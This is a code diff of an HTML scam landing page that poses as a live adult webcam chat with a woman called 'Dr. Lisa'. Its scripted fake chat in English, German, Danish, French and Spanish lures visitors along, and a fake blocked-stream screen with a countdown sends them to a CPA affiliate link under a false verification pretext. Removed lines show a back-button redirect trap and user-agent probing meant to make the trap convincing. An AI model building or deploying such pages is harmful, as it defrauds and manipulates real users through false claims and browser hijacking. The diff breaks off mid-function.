@@ -7,58 +7,19 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        body { 
-            background-color: #030303; 
-            color: #ffffff; 
-            font-family: 'Inter', sans-serif;
-            overflow-x: hidden;
-            touch-action: pan-y; /* Prevent pull-to-refresh on mobile */
-        }
+        body { background-color: #030303; color: #ffffff; font-family: 'Inter', sans-serif; overflow-x: hidden; touch-action: pan-y; }
         h1, h2, button, .font-bold { font-family: 'Montserrat', sans-serif; }
-
-        .neon-blob {
-            position: fixed; width: 400px; height: 400px; 
-            background: radial-gradient(circle, rgba(0,242,255,0.15) 0%, rgba(0,0,0,0) 70%);
-            z-index: -1; filter: blur(60px);
-        }
-
-        .glass { 
-            background: rgba(255, 255, 255, 0.03); 
-            backdrop-filter: blur(25px); 
-            -webkit-backdrop-filter: blur(25px);
-            border: 1px solid rgba(255, 255, 255, 0.1); 
-            border-radius: 24px;
-        }
-
-        @keyframes ring-pulse {
-            0% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); transform: scale(1); }
-            50% { transform: scale(1.1); }
-            70% { box-shadow: 0 0 0 25px rgba(34, 197, 94, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); transform: scale(1); }
-        }
+        .neon-blob { position: fixed; width: 400px; height: 400px; background: radial-gradient(circle, rgba(0,242,255,0.15) 0%, rgba(0,0,0,0) 70%); z-index: -1; filter: blur(60px); }
+        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; }
+        @keyframes ring-pulse { 0% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.7); transform: scale(1); } 50% { transform: scale(1.1); } 70% { box-shadow: 0 0 0 25px rgba(34, 197, 94, 0); } 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); transform: scale(1); } }
         .btn-accept { animation: ring-pulse 1s infinite; }
-
-        @keyframes avatar-pulse {
-            0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(0, 242, 255, 0.5); }
-            50% { transform: scale(1.05); box-shadow: 0 0 50px rgba(0, 242, 255, 0.9); }
-        }
+        @keyframes avatar-pulse { 0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(0, 242, 255, 0.5); } 50% { transform: scale(1.05); box-shadow: 0 0 50px rgba(0, 242, 255, 0.9); } }
         .avatar-calling { animation: avatar-pulse 1.5s infinite; }
-
         .custom-scrollbar::-webkit-scrollbar { width: 4px; }
         .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(0, 242, 255, 0.5); border-radius: 4px; }
-
-        @keyframes loadProgress {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
-        .loading-bar { animation: loadProgress 2s ease-in-out forwards; }
-        
-        /* Shaking effect for urgency */
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-5px); }
-            75% { transform: translateX(5px); }
-        }
+        @keyframes loadProgress { 0% { width: 0%; } 100% { width: 100%; } }
+        .loading-bar { animation: loadProgress 2.5s ease-in-out forwards; }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
         .shake-text { animation: shake 0.5s infinite; }
     </style>
 </head>
@@ -68,13 +29,11 @@
 
     <div id="entryScreen" class="fixed inset-0 bg-black z-[200] flex flex-col items-center justify-center px-6">
         <div class="glass p-8 max-w-sm w-full text-center border-cyan-400/30 border">
-            <div class="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
-                <span class="text-2xl">🔞</span>
-            </div>
-            <h2 class="text-2xl font-black text-white mb-2">18+ PRIVATE ROOM</h2>
-            <p class="text-xs text-gray-400 mb-6">Dr. Lisa is currently live. You must verify you are 18 or older to enter the private stream.</p>
-            <button onclick="startExperience()" class="w-full bg-cyan-400 py-4 rounded-xl font-black text-black hover:bg-cyan-300 transition shadow-[0_0_20px_rgba(0,242,255,0.4)] text-lg animate-pulse">
-                I AM 18+ (ENTER ROOM)
+            <div class="w-16 h-16 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4"><span class="text-2xl">🔞</span></div>
+            <h2 id="lang-entry-title" class="text-2xl font-black text-white mb-2">18+ PRIVATE ACCESS</h2>
+            <p id="lang-entry-desc" class="text-xs text-gray-400 mb-6">Dr. Lisa is currently in her private lounge. Confirm your age to open the direct live interaction chat.</p>
+            <button onclick="startExperience()" id="lang-entry-btn" class="w-full bg-cyan-400 py-4 rounded-xl font-black text-black hover:bg-cyan-300 transition shadow-[0_0_20px_rgba(0,242,255,0.4)] text-lg">
+                I AM 18+ (CONNECT)
             </button>
         </div>
     </div>
@@ -82,198 +41,319 @@
     <div class="neon-blob top-0 -left-20"></div>
     <div class="neon-blob bottom-0 -right-20" style="background: radial-gradient(circle, rgba(112,0,255,0.15) 0%, rgba(0,0,0,0) 70%);"></div>
 
-    <div id="mainContent" class="transition-all duration-500 hidden">
+    <div id="mainContent" class="transition-all duration-500 hidden pb-20">
         <header class="p-4 md:p-6 border-b border-white/10 flex justify-between items-center glass sticky top-0 z-40">
             <div class="flex items-center gap-3 md:gap-4">
                 <img src="https://raw.githubusercontent.com/mizan000321-ops/newv/main/GoWoZl9X0AA1I6V.jpg" class="w-10 h-10 md:w-12 md:h-12 rounded-full border-2 border-cyan-400 object-cover shadow-lg shadow-cyan-500/30">
                 <div>
                     <h1 class="text-lg md:text-xl font-black italic">DR. LISA <span class="text-cyan-400">CHRISTIANSEN</span></h1>
-                    <p class="text-[9px] md:text-[10px] text-gray-500 tracking-widest uppercase">1-on-1 VIP Status</p>
+                    <p id="lang-header-sub" class="text-[9px] md:text-[10px] text-gray-500 tracking-widest uppercase">Verified 1-on-1 Session</p>
                 </div>
             </div>
             <div class="flex items-center gap-2 bg-red-500/10 px-3 py-1 rounded-full border border-red-500/30">
                 <span class="w-2 h-2 bg-red-500 rounded-full animate-ping"></span>
-                <span class="text-[10px] md:text-xs font-bold text-red-500 uppercase tracking-tighter" id="viewerCount">1 Viewer</span>
+                <span id="lang-header-live" class="text-[10px] md:text-xs font-bold text-red-500 uppercase tracking-tighter">Live Room</span>
             </div>
         </header>
 
-        <div class="max-w-7xl mx-auto px-4 mt-6 md:mt-8 grid grid-cols-1 lg:grid-cols-3 gap-6 md:gap-8">
-            <div class="lg:col-span-2 space-y-6">
-                <div class="relative rounded-[24px] md:rounded-[32px] overflow-hidden glass border-white/10 aspect-video shadow-2xl group cursor-pointer" onclick="goToCPA()">
-                    <iframe id="liveCam" src="https://drive.google.com/file/d/1ukOYy9zg6iNI1TdMOV98l5wbuTnEvU9D/preview" class="w-full h-full pointer-events-none opacity-40 brightness-110 blur-md" frameborder="0"></iframe>
-                    <div class="absolute inset-0 flex flex-col items-center justify-center z-20">
-                        <div class="w-16 h-16 bg-cyan-400/20 border-2 border-cyan-400 rounded-full flex items-center justify-center backdrop-blur-md mb-4 animate-spin" style="animation-duration: 3s;">
-                            <svg class="w-8 h-8 text-cyan-400 ml-1" fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+        <div class="max-w-7xl mx-auto px-4 mt-6 grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <div class="lg:col-span-1 space-y-6">
+                <div class="relative rounded-[24px] overflow-hidden glass border-white/10 aspect-square shadow-2xl">
+                    <iframe src="https://drive.google.com/file/d/1ukOYy9zg6iNI1TdMOV98l5wbuTnEvU9D/preview" class="w-full h-full pointer-events-none opacity-30 brightness-110 blur-xl" frameborder="0"></iframe>
+                    <div class="absolute inset-0 flex flex-col items-center justify-center z-20 p-4">
+                        <div class="w-14 h-14 bg-cyan-400/20 border-2 border-cyan-400 rounded-full flex items-center justify-center backdrop-blur-md mb-3 animate-pulse">
+                            <svg class="w-6 h-6 text-cyan-400" fill="currentColor" viewBox="0 0 24 24"><path d="M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4z"/></svg>
                         </div>
-                        <p class="text-xs font-black uppercase tracking-widest text-cyan-400 text-center px-4">Initializing Secure Feed...</p>
+                        <p id="lang-cam-status" class="text-[11px] font-black uppercase tracking-widest text-cyan-400 text-center">Camera Standing By...</p>
                     </div>
                 </div>
             </div>
 
-            <div class="glass flex flex-col h-[500px] md:h-[600px] border-white/10 relative overflow-hidden">
+            <div class="lg:col-span-2 glass flex flex-col h-[550px] border-white/10 relative overflow-hidden shadow-2xl">
                 <div class="p-4 border-b border-white/10 bg-black/40 flex justify-between items-center">
-                    <h3 class="font-black text-[10px] md:text-xs uppercase tracking-widest text-gray-400">Live Encrypted Chat</h3>
-                    <span class="text-[9px] text-green-400 bg-green-400/10 px-2 py-1 rounded">Secure</span>
+                    <div class="flex items-center gap-2">
+                        <span class="w-2 h-2 bg-green-500 rounded-full"></span>
+                        <h3 id="lang-chat-header" class="font-black text-xs uppercase tracking-widest text-gray-300">Dr. Lisa (Online)</h3>
+                    </div>
+                    <span id="typingStatus" class="text-xs text-cyan-400 italic font-medium opacity-0 transition-opacity duration-300">...</span>
                 </div>
-                <div id="chatBox" class="flex-1 p-4 overflow-y-auto space-y-4 text-xs md:text-sm font-light custom-scrollbar"></div>
+                
+                <div id="chatBox" class="flex-1 p-4 overflow-y-auto space-y-4 text-sm custom-scrollbar bg-black/20"></div>
+
+                <div class="p-4 border-t border-white/10 bg-black/40 flex gap-2 items-center">
+                    <input type="text" id="userInput" placeholder="Type..." class="flex-1 bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white focus:outline-none focus:border-cyan-400 transition" onkeypress="if(event.key === 'Enter') sendMessage()">
+                    <button onclick="sendMessage()" id="lang-send-btn" class="bg-cyan-400 text-black font-black px-6 py-3 rounded-xl hover:bg-cyan-300 transition text-sm uppercase tracking-wider">Send</button>
+                </div>
             </div>
         </div>
     </div>
 
     <div id="incomingCallScreen" class="fixed inset-0 bg-[#0a0a0a]/95 backdrop-blur-3xl z-[100] flex flex-col items-center justify-between py-16 hidden opacity-0 transition-opacity duration-500">
         <div class="text-center mt-10 w-full px-4">
-            <p class="text-cyan-400 text-sm font-bold tracking-widest uppercase mb-4 animate-pulse">Incoming Private Video Request</p>
+            <p id="lang-call-top" class="text-cyan-400 text-sm font-bold tracking-widest uppercase mb-4 animate-pulse">Auto-Connecting Feed</p>
             <div class="relative w-32 h-32 md:w-48 md:h-48 mx-auto mb-6">
-                <div class="absolute inset-0 rounded-full border-4 border-cyan-400/30 animate-ping" style="animation-duration: 1s;"></div>
-                <div class="absolute -inset-4 rounded-full border-2 border-cyan-400/10 animate-ping" style="animation-duration: 1.5s;"></div>
+                <div class="absolute inset-0 rounded-full border-4 border-cyan-400/30 animate-ping"></div>
                 <img src="https://raw.githubusercontent.com/mizan000321-ops/newv/main/GoWoZl9X0AA1I6V.jpg" class="w-full h-full rounded-full border-4 border-cyan-400 object-cover avatar-calling relative z-10 shadow-[0_0_50px_rgba(0,242,255,0.6)]">
             </div>
             <h2 class="text-3xl md:text-5xl font-black text-white tracking-tight mb-2">Dr. Lisa Christiansen</h2>
-            <p class="text-green-400 text-lg md:text-xl font-bold animate-pulse">Live 1-on-1 Call...</p>
+            <p id="lang-call-status" class="text-green-400 text-lg md:text-xl font-bold animate-pulse">Incoming Video Invitation...</p>
         </div>
-
         <div class="flex justify-center gap-16 w-full px-8 mb-10">
             <div class="flex flex-col items-center gap-3 cursor-pointer z-50" onclick="handleCallAction('decline')">
-                <div class="w-16 h-16 md:w-20 md:h-20 bg-red-600 rounded-full flex items-center justify-center hover:bg-red-500 transition shadow-[0_0_20px_rgba(220,38,38,0.5)]">
-                    <svg class="w-8 h-8 text-white transform rotate-[135deg]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16.32v3.38a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 013.31 2h3.38a2 2 0 012 1.72 12.84 12.84 0 00.57 2.81 2 2 0 01-.45 2.11L7.5 10.05a16.03 16.03 0 006.45 6.45l1.41-1.41a2 2 0 012.11-.45 12.84 12.84 0 002.81.57A2 2 0 0121 16.32z"/></svg>
-                </div>
-                <span class="text-white text-xs font-bold tracking-wider">Decline</span>
+                <div class="w-16 h-16 md:w-20 md:h-20 bg-red-600 rounded-full flex items-center justify-center hover:bg-red-500 transition"><svg class="w-8 h-8 text-white transform rotate-[135deg]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16.32v3.38a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 013.31 2h3.38a2 2 0 012 1.72 12.84 12.84 0 00.57 2.81 2 2 0 01-.45 2.11L7.5 10.05a16.03 16.03 0 006.45 6.45l1.41-1.41a2 2 0 012.11-.45 12.84 12.84 0 002.81.57A2 2 0 0121 16.32z"/></svg></div>
+                <span id="lang-decline" class="text-white text-xs font-bold tracking-wider">Decline</span>
             </div>
-
             <div class="flex flex-col items-center gap-3 cursor-pointer z-50" onclick="handleCallAction('accept')">
-                <div class="w-16 h-16 md:w-20 md:h-20 bg-green-500 rounded-full flex items-center justify-center btn-accept hover:bg-green-400 transition">
-                    <svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16.32v3.38a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 013.31 2h3.38a2 2 0 012 1.72 12.84 12.84 0 00.57 2.81 2 2 0 01-.45 2.11L7.5 10.05a16.03 16.03 0 006.45 6.45l1.41-1.41a2 2 0 012.11-.45 12.84 12.84 0 002.81.57A2 2 0 0121 16.32z"/></svg>
-                </div>
-                <span class="text-white text-xs font-bold tracking-wider">Accept</span>
+                <div class="w-16 h-16 md:w-20 md:h-20 bg-green-500 rounded-full flex items-center justify-center btn-accept hover:bg-green-400 transition"><svg class="w-8 h-8 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16.32v3.38a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07 19.5 19.5 0 01-6-6 19.79 19.79 0 01-3.07-8.67A2 2 0 013.31 2h3.38a2 2 0 012 1.72 12.84 12.84 0 00.57 2.81 2 2 0 01-.45 2.11L7.5 10.05a16.03 16.03 0 006.45 6.45l1.41-1.41a2 2 0 012.11-.45 12.84 12.84 0 002.81.57A2 2 0 0121 16.32z"/></svg></div>
+                <span id="lang-accept" class="text-white text-xs font-bold tracking-wider">Accept</span>
             </div>
         </div>
     </div>
 
     <div id="connectingScreen" class="fixed inset-0 bg-[#0a0a0a] z-[110] flex flex-col items-center justify-center p-6 hidden">
-        
         <div id="loadingPhase" class="text-center w-full max-w-md">
             <img src="https://raw.githubusercontent.com/mizan000321-ops/newv/main/GoWoZl9X0AA1I6V.jpg" class="w-24 h-24 rounded-full border-2 border-cyan-400 mx-auto mb-6 object-cover opacity-60">
-            <h2 class="text-2xl font-black text-white mb-4 animate-pulse">Decrypting Connection...</h2>
-            <div class="w-full bg-gray-800 rounded-full h-3 mb-2 overflow-hidden shadow-inner">
-                <div class="bg-gradient-to-r from-cyan-600 to-cyan-400 h-3 rounded-full loading-bar"></div>
-            </div>
-            <p class="text-[10px] text-cyan-400 font-mono" id="syncText">Syncing Video/Audio Packets...</p>
+            <h2 id="lang-loading-title" class="text-2xl font-black text-white mb-4 animate-pulse">Establishing Secure P2P Stream...</h2>
+            <div class="w-full bg-gray-800 rounded-full h-3 mb-2 overflow-hidden shadow-inner"><div class="bg-gradient-to-r from-cyan-600 to-cyan-400 h-3 rounded-full loading-bar"></div></div>
+            <p class="text-[10px] text-cyan-400 font-mono" id="syncText">...</p>
         </div>
 
         <div id="verifyPhase" class="text-center w-full max-w-md glass border-red-500 p-6 md:p-8 rounded-[32px] hidden shadow-[0_0_60px_rgba(239,68,68,0.3)]">
             <div class="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4 border border-red-500/50 shake-text">
                 <svg class="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
             </div>
-            <h2 class="text-3xl font-black text-white mb-1 tracking-tighter">CALL BLOCKED</h2>
-            
-            <p class="text-red-500 font-mono text-xs md:text-sm uppercase tracking-wider mb-5 font-bold bg-red-500/10 py-2 rounded-lg border border-red-500/20" id="deviceBlockText">Unregistered Device Detected</p>
-            
+            <h2 id="lang-block-title" class="text-3xl font-black text-white mb-1 tracking-tighter">STREAM BLOCKED</h2>
+            <p class="text-red-500 font-mono text-xs md:text-sm uppercase tracking-wider mb-5 font-bold bg-red-500/10 py-2 rounded-lg border border-red-500/20" id="deviceBlockText">Loading protocols...</p>
             <div class="bg-black/60 p-4 rounded-xl border border-white/10 mb-5 text-left relative overflow-hidden">
                 <div class="absolute top-0 left-0 w-1 h-full bg-cyan-400"></div>
-                <p class="text-xs md:text-sm text-gray-200 leading-relaxed pl-2">
-                    Dr. Lisa is on hold. To prevent bots and minors, you must <span class="text-cyan-400 font-bold">create a FREE account</span> to register your IP and instantly resume the call.
-                </p>
+                <p id="lang-block-desc" class="text-xs md:text-sm text-gray-200 leading-relaxed pl-2">Verification required.</p>
             </div>
-            
             <div class="mb-5 text-center">
-                <p class="text-[10px] text-gray-400 uppercase tracking-widest mb-1">Session Timeout In:</p>
-                <p id="countdownDisplay" class="text-3xl font-mono font-black text-red-500 tracking-widest animate-pulse">03:00</p>
+                <p id="lang-countdown-txt" class="text-[10px] text-gray-400 uppercase tracking-widest mb-1">Reservation Expires In:</p>
+                <p id="countdownDisplay" class="text-3xl font-mono font-black text-red-500 tracking-widest animate-pulse">02:30</p>
             </div>
-            
-            <button onclick="goToCPA()" class="w-full bg-cyan-400 py-5 rounded-2xl font-black text-xl text-black hover:bg-cyan-300 transition transform hover:scale-[1.02] shadow-[0_0_30px_rgba(0,242,255,0.5)] flex items-center justify-center gap-2">
-                VERIFY ACCOUNT NOW <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
-            </button>
-            <p class="text-[10px] text-gray-500 mt-4 uppercase font-bold tracking-widest">Takes 30 Seconds • 100% Free • Secure</p>
+            <button onclick="goToCPA()" id="lang-cpa-btn" class="w-full bg-cyan-400 py-5 rounded-2xl font-black text-xl text-black hover:bg-cyan-300 transition shadow-[0_0_30px_rgba(0,242,255,0.5)] flex items-center justify-center gap-2">CREATE FREE ACCOUNT</button>
         </div>
-
     </div>
 
     <script>
         const cpaLink = "https://t.taffizerq.com/click?pid=3844&offer_id=2310";
-        
-        function goToCPA() { 
-            window.location.href = cpaLink; 
-        }
+        let userName = "Babe"; 
+        let chatStep = 0;
+        let currentLang = "en";
 
-        // BACK-BUTTON TRAP: If they try to leave, redirect to CPA!
-        history.pushState(null, null, location.href);
-        window.onpopstate = function () {
-            window.location.href = cpaLink;
+        // Multilingual Localization Database (5 Top Tier Countries Embedded)
+        const localization = {
+            en: {
+                entryTitle: "18+ PRIVATE ACCESS", entryDesc: "Dr. Lisa is currently in her private lounge. Confirm your age to open the direct live interaction chat.", entryBtn: "I AM 18+ (CONNECT)",
+                headerSub: "Verified 1-on-1 Session", headerLive: "Live Room", camStatus: "Camera Standing By...", chatHeader: "Dr. Lisa (Online)", typing: "Lisa is typing...",
+                placeholder: "Type your message here...", sendBtn: "Send", callTop: "Auto-Connecting Face-To-Face Feed", callStatus: "Incoming Video Invitation...",
+                decline: "Decline", accept: "Accept", loadTitle: "Establishing Secure P2P Stream...", blockTitle: "STREAM BLOCKED", blockDesc: "Dr. Lisa is waiting on the secure line. Due to mandatory anti-bot & age verification protocols, you must <span class='text-cyan-400 font-bold'>create a FREE secure account</span> to unlock your direct video feed.",
+                countTxt: "Reservation Expires In:", cpaBtn: "CREATE FREE VERIFIED ACCOUNT 📞",
+                script: [
+                    "Hey! I'm finally alone in my room and turned my webcam on. 🤫 I hate chatting with bots though... What's your name so I know you are real? ❤️",
+                    "Wow, {name}! That’s a hot name. Are you from around here? What do you usually look for in a girl like me? 💋",
+                    "Mmm I love that... Honestly, I am getting a bit tired of just typing here. Can you see my camera preview module standing by on your screen? Tell me if it's visible...",
+                    "Perfect! I was hoping you'd say that. I actually wanted to ask, how old are you? I only like mature guys who know how to treat a woman right... 😉",
+                    "That's exactly what I like to hear. Let's not waste any more time typing then. I want to see you too. Are you ready if I call you right now? Tell me 'yes'!",
+                    "Awesome. I am hitting the direct face-to-face video invite button on my dashboard right now so our cameras link up! Answer it immediately on your screen okay? Sending it now... 💋"
+                ]
+            },
+            de: { // German
+                entryTitle: "18+ PRIVATER ZUGANG", entryDesc: "Dr. Lisa ist derzeit in ihrer privaten Lounge. Bestätigen Sie Ihr Alter, um den direkten Live-Chat zu öffnen.", entryBtn: "ICH BIN 18+ (VERBINDEN)",
+                headerSub: "Verifizierte 1-zu-1-Sitzung", headerLive: "Live-Raum", camStatus: "Kamera ist betriebsbereit...", chatHeader: "Dr. Lisa (Online)", typing: "Lisa schreibt...",
+                placeholder: "Schreibe deine Nachricht hier...", sendBtn: "Senden", callTop: "Automatische Video-Verbindung", callStatus: "Eingehende Video-Einladung...",
+                decline: "Ablehnen", accept: "Annehmen", loadTitle: "Sichere P2P-Streaming wird aufgebaut...", blockTitle: "STREAM BLOCKIERT", blockDesc: "Dr. Lisa wartet auf der sicheren Leitung. Aufgrund obligatorischer Anti-Bot- und Altersverifizierungsprotokolle müssen Sie ein <span class='text-cyan-400 font-bold'>KOSTENLOSES sicheres Konto erstellen</span>, um Ihren direkten Video-Feed freizuschalten.",
+                countTxt: "Reservierung läuft ab in:", cpaBtn: "KOSTENLOSES KONTO ERSTELLEN 📞",
+                script: [
+                    "Hey! Ich bin endlich allein in meinem Zimmer und habe meine Webcam eingeschaltet. 🤫 Ich hasse es aber, mit Bots zu chatten... Wie heißt du, damit ich weiß, dass du echt bist? ❤️",
+                    "Wow, {name}! Das ist ein heißer Name. Kommst du aus der Nähe? Wonach suchst du normalerweise bei einem Mädchen wie mir? 💋",
+                    "Mmm, das liebe ich... Ehrlich gesagt, werde ich langsam müde, hier nur zu tippen. Kannst du meine Kamera-Vorschau auf deinem Bildschirm sehen? Sag mir, ob sie sichtbar ist...",
+                    "Perfekt! Ich habe gehofft, dass du das sagst. Ich wollte dich eigentlich fragen, wie alt du bist? Ich stehe nur auf reife Männer, die wissen, wie man eine Frau richtig behandelt... 😉",
+                    "Das ist genau das, was ich hören will. Lass uns keine Zeit mehr mit Tippen verschwenden. Ich möchte dich auch sehen. Bist du bereit, wenn ich dich jetzt anrufe? Sag mir 'ja'!",
+                    "Großartig. Ich drücke jetzt den direkten Video-Einladungsknopf auf meinem Dashboard, damit sich unsere Kameras verbinden! Antworte sofort auf deinem Bildschirm, okay? Ich sende es jetzt... 💋"
+                ]
+            },
+            da: { // Danish
+                entryTitle: "18+ PRIVAT ADGANG", entryDesc: "Dr. Lisa er i øjeblikket i sin private lounge. Bekræft din alder for at åbne den direkte live interaktionschat.", entryBtn: "JEG ER 18+ (FORBIND)",
+                headerSub: "Verificeret 1-til-1-session", headerLive: "Live-Rum", camStatus: "Kamera Står Klar...", chatHeader: "Dr. Lisa (Online)", typing: "Lisa skriver...",
+                placeholder: "Skriv din besked her...", sendBtn: "Send", callTop: "Automatisk Ansigt-til-Ansigt Forbindelse", callStatus: "Indkommende Videoinvitation...",
+                decline: "Afvis", accept: "Accepter", loadTitle: "Etablerer Sikker P2P Stream...", blockTitle: "STREAM BLOKERET", blockDesc: "Dr. Lisa venter på den sikre linje. På grund af obligatoriske anti-bot- og aldersverifikationsprotokoller skal du <span class='text-cyan-400 font-bold'>oprette en GRATIS sikker konto</span> for at låse op for dit direkte videofeed.",
+                countTxt: "Reservationen Udløber Om:", cpaBtn: "OPRET GRATIS VERIFICERET KONTO 📞",
+                script: [
+                    "Hey! Jeg er endelig alene på mit værelse og har tændt mit webcam. 🤫 Jeg hader dog at chatte med robotter... Hvad hedder du, så jeg ved, du er ægte? ❤️",
+                    "Wow, {name}! Det er et frækt navn. Er du herfra i nærheden? Hvad leder du normalt efter hos en pige som mig? 💋",
+                    "Mmm, det elsker jeg... Helt ærligt, jeg er ved at være lidt træt af bare at skrive her. Kan du se mit kamera-forhåndsvisningsmodul på din skærm? Fortæl mij, om det er synligt...",
+                    "Perfekt! Det håbede jeg, du ville sige. Jeg ville faktisk spørge, hvor gammel du er? Jeg kan kun lide modne fyre, der ved, hvordan man behandler en kvinde ordentligt... 😉",
+                    "Det er præcis, hvad jeg vil høre. Lad os ikke spilde mere tid på at skrive. Jeg vil også gerne se dig. Er du klar, hvis jeg ringer til dig lige nu? Sig 'ja'!",
+                    "Fantastisk. Jeg trykker på den direkte videoinvitationsknap på mit dashboard lige nu, så vores kameraer bliver forbundet! Svar med det samme på din skærm, okay? Sender den nu... 💋"
+                ]
+            },
+            fr: { // French
+                entryTitle: "ACCÈS PRIVÉ 18+", entryDesc: "Le Dr Lisa est actuellement dans son salon privé. Confirmez votre âge pour ouvrir le chat d'interaction en direct.", entryBtn: "J'AI 18+ ANS (CONNEXION)",
+                headerSub: "Session 1-à-1 vérifiée", headerLive: "Salon En Direct", camStatus: "Caméra en attente...", chatHeader: "Dr. Lisa (En ligne)", typing: "Lisa écrit...",
+                placeholder: "Tapez votre message ici...", sendBtn: "Envoyer", callTop: "Connexion vidéo automatique", callStatus: "Invitation vidéo entrante...",
+                decline: "Refuser", accept: "Accepter", loadTitle: "Établissement d'un flux P2P sécurisé...", blockTitle: "FLUX BLOQUÉ", blockDesc: "Le Dr Lisa attend sur la ligne sécurisée. En raison des protocoles obligatoires anti-bot et de vérification de l'âge, vous devez <span class='text-cyan-400 font-bold'>créer un compte sécurisé GRATUIT</span> pour débloquer votre flux vidéo direct.",
+                countTxt: "La réservation expire dans :", cpaBtn: "CRÉER UN COMPTE VÉRIFIÉ GRATUIT 📞",
+                script: [
+                    "Hey ! Je am enfin seule dans ma chambre et j'ai allumé ma webcam. 🤫 J'ai horreur de discuter avec des bots... Quel est ton nom pour que je sache que tu es réel ? ❤️",
+                    "Wow, {name} ! C'est un prénom sexy. Tu es du coin ? Qu'est-ce que tu recherches d'habitude chez une fille comme moi ? 💋",
+                    "Mmm j'adore ça... Franchement, je commence à en avoir marre de juste taper des messages. Tu vois l'aperçu de ma caméra sur ton écran ? Dis-moi si c'est visible...",
+                    "Parfait ! J'espérais que tu dirais ça. En fait, je voulais te demander, quel âge as-tu ? Je n'aime que les hommes mûrs qui savent comment traiter une femme... 😉",
+                    "C'est exactement ce que je voulais entendre. Ne perdons plus de temps à écrire. Je veux te voir aussi. Tu es prêt si je t'appelle tout de suite ? Dis-moi 'oui' !",
+                    "Génial. J'appuie sur le bouton d'invitation vidéo directe sur mon tableau de bord pour que nos caméras se connectent ! Réponds immédiatement sur ton écran, d'accord ? Je l'envoie... 💋"
+                ]
+            },
+            es: { // Spanish
+                entryTitle: "ACCESO PRIVADO 18+", entryDesc: "La Dra. Lisa se encuentra actualmente en su salón privado. Confirma tu edad para abrir el chat de interacción en vivo.", entryBtn: "SOY 18+ (CONECTAR)",
+                headerSub: "Sesión 1 a 1 Verificada", headerLive: "Sala En Vivo", camStatus: "Cámara en espera...", chatHeader: "Dra. Lisa (En línea)", typing: "Lisa está escribiendo...",
+                placeholder: "Escribe tu mensaje aquí...", sendBtn: "Enviar", callTop: "Conexión de video automática", callStatus: "Invitación de video entrante...",
+                decline: "Rechazar", accept: "Aceptar", loadTitle: "Estableciendo transmisión segura P2P...", blockTitle: "TRANSMISIÓN BLOQUEADA", blockDesc: "La Dra. Lisa está esperando en la línea segura. Debido a los protocolos obligatorios anti-bot y de verificación de edad, debes <span class='text-cyan-400 font-bold'>crear una cuenta segura GRATUITA</span> para desbloquear tu transmisión de video.",
+                countTxt: "La reservación expira en:", cpaBtn: "CREAR CUENTA VERIFICADA GRATIS 📞",
+                script: [
+                    "¡Hola! Por fin estoy sola en mi habitación y encendí mi cámara web. 🤫 Odio chatear con bots... ¿Cómo te llamas para saber que eres real? ❤️",
+                    "¡Vaya, {name}! Es un nombre sexy. ¿Eres de por aquí? ¿Qué sueles buscar en una chica como yo? 💋",
+                    "Mmm me encanta eso... Honestamente, me estoy cansando de solo escribir. ¿Puedes ver el módulo de vista previa de mi cámara en tu pantalla? Dime si se ve...",
+                    "¡Perfecto! Esperaba que dijeras eso. De hecho, quería preguntarte, ¿cuántos años tienes? Solo me gustan los hombres maduros que saben cómo tratar a una mujer... 😉",
+                    "Eso es exactamente lo que quiero escuchar. No perdamos más tiempo escribiendo. Yo también quiero verte. ¿Estás listo si te llamo ahora mismo? ¡Dime que 'sí'!",
+                    "Estupendo. ¡Estoy presionando el botón de invitación de video directo en mi panel ahora mismo para que nuestras cámaras se vinculen! Responde de inmediato en tu pantalla, ¿vale? Enviándolo ahora... 💋"
+                ]
+            }
         };
 
-        // Get Location/Device to make the trap feel incredibly real
-        function getAdvancedDeviceInfo() {
-            let device = "Mobile Device";
-            const ua = navigator.userAgent;
